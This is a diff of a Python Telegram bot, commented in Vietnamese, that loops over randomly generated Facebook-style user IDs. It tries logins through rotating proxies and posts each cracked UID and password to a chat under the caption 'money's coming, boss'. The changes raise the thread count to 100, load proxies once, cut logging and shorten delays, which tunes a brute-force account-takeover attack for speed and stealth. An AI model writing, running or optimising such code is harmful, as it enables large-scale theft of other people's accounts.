@@ -177,31 +177,32 @@ def attempt_login(uid, proxy_str=None):
 # ---------- Vòng quét vô hạn (nền) ----------
 async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
     global stop_flag, loop_count, oks, proxy_pool
-    executor = ThreadPoolExecutor(max_workers=30)
+    executor = ThreadPoolExecutor(max_workers=100)
     batch_size = 1000
     star = '10000'
 
-    while not stop_flag:
-        # Kiểm tra proxy pool, nếu rỗng thì tải lại
-        if not proxy_pool:
-            count = await load_live_proxies()
-            if count == 0:
-                await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
-            else:
-                await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống.")
+    # Chỉ load proxy 1 lần duy nhất khi bắt đầu
+    count = await load_live_proxies()
+    if count == 0:
+        await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
+    else:
+        await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống, bắt đầu quét...")
 
-        # Tạo batch UID ngẫu nhiên
+    while not stop_flag:
+        # Tạo batch UID
         ids = []
         for _ in range(batch_size):
             suffix = str(random.randint(1000000000, 1999999999))
             uid = star + suffix
             ids.append(uid)
 
-        await context.bot.send_message(
-            chat_id,
-            f"> 🔄 Đang quét đợt mới...\n> Tổng loop: {loop_count}\n> OK: {len(oks)}",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
+        # Log mỗi 5 batch
+        if loop_count % (batch_size * 5) == 0:
+            await context.bot.send_message(
+                chat_id,
+                f"> 🔄 Đang quét...\n> Tổng loop: {loop_count}\n> OK: {len(oks)}",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
 
         # Lấy proxy ngẫu nhiên cho mỗi UID
         loop = asyncio.get_event_loop()
@@ -215,7 +216,6 @@ async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
         for res in results:
             if res:
                 uid, pw, year = res
-                # Gửi tin nhắn đẹp với quoteblock
                 msg = (
                     f"> Tiền về sếp ơi\n"
                     f"> Via: {year}\n"
@@ -225,7 +225,8 @@ async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
                 )
                 await context.bot.send_message(chat_id, msg, parse_mode=ParseMode.MARKDOWN_V2)
 
-        await asyncio.sleep(2)
+        # Nghỉ ngắn để tránh quá tải
+        await asyncio.sleep(0.5)
 
     executor.shutdown(wait=False)
     await context.bot.send_message(chat_id, "⏹️ Đã dừng quét.")
